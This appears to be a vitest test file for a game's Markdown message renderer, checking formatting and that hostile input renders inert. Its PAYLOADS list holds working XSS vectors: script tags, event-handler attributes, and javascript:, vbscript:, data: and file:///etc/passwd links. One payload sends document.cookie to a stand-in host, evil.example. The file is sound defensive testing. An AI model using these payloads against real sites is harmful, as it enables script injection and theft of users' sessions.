import { describe, it, expect } from "vitest";
import { JSDOM } from "jsdom";
import { inlineHtml, markdownHtml, safeHref } from "../../public/scripts/markdown.js";

// AB#2467: Inbox and conversation messages render Markdown. A player writes them, so each is an attacker's text: the
// payloads below are real XSS vectors, rendered into a real DOM and searched for anything live.
const dom = (html) => new JSDOM(`<div id="m">${html}</div>`).window.document.getElementById("m");

describe("a message's Markdown renders formatted (AB#2467)", () => {
  it("bold, italic, code, links and lists", () => {
    const el = dom(markdownHtml("Hello **Kestrel**, *urgent*:\n\n- 400 Silicates\n- 200 _Nickel_\n\n1. Dock\n2. Sell at [the Exchange](https://example.com/gex)\n\nRef `LIC-2147-ABC123`."));
    expect(el.querySelector("strong").textContent).toBe("Kestrel");
    expect([...el.querySelectorAll("em")].map((e) => e.textContent)).toEqual(["urgent", "Nickel"]);
    expect([...el.querySelectorAll("ul > li")].map((e) => e.textContent)).toEqual(["400 Silicates", "200 Nickel"]);
    expect([...el.querySelectorAll("ol > li")].map((e) => e.textContent)).toEqual(["Dock", "Sell at the Exchange"]);
    const a = el.querySelector("a");
    expect(a.getAttribute("href")).toBe("https://example.com/gex");
    expect(a.getAttribute("rel")).toBe("noopener noreferrer nofollow");
    expect(a.getAttribute("target")).toBe("_blank");
    expect(el.querySelector("code").textContent).toBe("LIC-2147-ABC123");
  });

  it("keeps a letter's line breaks and paragraphs, and leaves plain text as it was", () => {
    const el = dom(markdownHtml("Mining Probe Return\n50 units — Nickel\n\nFiled by the ISA."));
    expect(el.querySelectorAll("p")).toHaveLength(2);
    expect(el.querySelector("p").innerHTML).toBe("Mining Probe Return<br>50 units — Nickel");
  });

  it("an underscore inside a word, or a lone asterisk, is a character", () => {
    expect(inlineHtml("tt_nano_lattice and 5 * 3 = 15")).toBe("tt_nano_lattice and 5 * 3 = 15");
    expect(inlineHtml("employee(s) at 2*3")).toBe("employee(s) at 2*3");
  });

  it("numbers a list from where it starts", () => {
    expect(markdownHtml("3. third\n4. fourth")).toBe('<ol start="3"><li>third</li><li>fourth</li></ol>');
  });
});

// Real payloads: each is one an attacker would send. None may leave an element other than the renderer's own, an
// attribute that runs code, or a link to anything but http, https or mailto.
const PAYLOADS = [
  "<script>window.__xss = 1</script>",
  '<img src=x onerror="window.__xss=1">',
  "<svg onload=alert(1)>",
  "<iframe src=javascript:alert(1)></iframe>",
  '"><script>alert(1)</script>',
  "**<img src=x onerror=alert(1)>**",
  "*<a href=javascript:alert(1)>x</a>*",
  "[click me](javascript:alert(1))",
  "[click me](JaVaScRiPt:alert(1))",
  "[click me](javascript&#58;alert(1))",
  "[click me](java\tscript:alert(1))",
  "[click me](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
  "[click me](vbscript:msgbox(1))",
  // No parentheses in the URL, so these reach the link rule and only the URL check stands between them and a link.
  "[click me](javascript:alert`1`)",
  "[click me](JAVASCRIPT:document.location='https://evil.example/?'+document.cookie)",
  "[click me](javascript:void0)",
  "[click me](vbscript:msgbox)",
  "[click me](file:///etc/passwd)",
  "[click me](//evil.example/x)",
  '[x](https://ok.example/"onmouseover="alert(1))',
  "[<img src=x onerror=alert(1)>](https://ok.example)",
  "[`<script>`](https://ok.example)",
  "- <script>alert(1)</script>\n- [x](javascript:alert(1))",
  "&lt;script&gt;alert(1)&lt;/script&gt;",
  "`</code><script>alert(1)</script>`"
];
const ALLOWED = new Set(["P", "BR", "STRONG", "EM", "CODE", "UL", "OL", "LI", "A"]);

describe("hostile Markdown renders inert (AB#2467)", () => {
  it.each(PAYLOADS)("%s", (payload) => {
    const el = dom(markdownHtml(payload));
    for (const node of el.querySelectorAll("*")) {
      expect(ALLOWED.has(node.tagName), `<${node.tagName.toLowerCase()}> from ${payload}`).toBe(true);
      for (const attr of node.attributes) {
        expect(["href", "target", "rel", "start"], `${attr.name} on <${node.tagName.toLowerCase()}>`).toContain(attr.name);
        expect(attr.name.startsWith("on")).toBe(false);
      }
    }
    for (const a of el.querySelectorAll("a")) expect(new URL(a.getAttribute("href")).protocol).toMatch(/^(https?|mailto):$/);
    // The typed text is still there to read: nothing the writer sent disappears silently.
    expect(el.textContent.length).toBeGreaterThan(0);
  });

  it("shows a script tag as the text that was typed", () => {
    const el = dom(markdownHtml("<script>window.__xss = 1</script>"));
    expect(el.querySelector("script")).toBeNull();
    expect(el.textContent).toBe("<script>window.__xss = 1</script>");
  });

  it("refuses a javascript: link: the label and URL stay as typed text, nothing to click", () => {
    const el = dom(markdownHtml("[click me](javascript:alert(1))"));
    expect(el.querySelector("a")).toBeNull();
    expect(el.textContent).toBe("[click me](javascript:alert(1))");
  });

  it("safeHref allows only absolute http, https and mailto", () => {
    expect(safeHref("https://example.com/a?b=1")).toBe("https://example.com/a?b=1");
    expect(safeHref("mailto:board@example.com")).toBe("mailto:board@example.com");
    for (const bad of ["javascript:alert(1)", " javascript:alert(1)", "JAVASCRIPT:alert(1)", "data:text/html,x", "/relative", "//evil.example", "https://", "http://a b"]) {
      expect(safeHref(bad), bad).toBeNull();
    }
    expect(safeHref('https://ok.example/"x')).toBe("https://ok.example/%22x");
  });
});
